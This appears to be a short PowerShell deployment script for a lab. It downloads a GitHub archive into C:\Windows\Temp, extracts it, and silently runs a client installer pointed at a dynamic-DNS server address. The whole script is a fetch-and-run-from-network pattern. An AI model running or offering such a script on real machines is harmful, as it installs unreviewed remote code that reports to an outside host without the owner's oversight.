[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression')
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
$installFileZip = 'c:\windows\temp\install.zip'
Invoke-WebRequest -Uri 'https://github.com/aalmeidasilva/azure/archive/main.zip' -Method Get -Outfile $installFileZip 
[System.IO.Compression.ZipFile]::ExtractToDirectory($installFileZip,'c:\Windows\temp') 

Start-Process -FilePath "C:\Windows\Temp\azure-main\SetupClient.exe" -WorkingDirectory "C:\Windows\Temp\azure-main\" -ArgumentList "/ServerAddress=labsilva.ddns.net","/S"
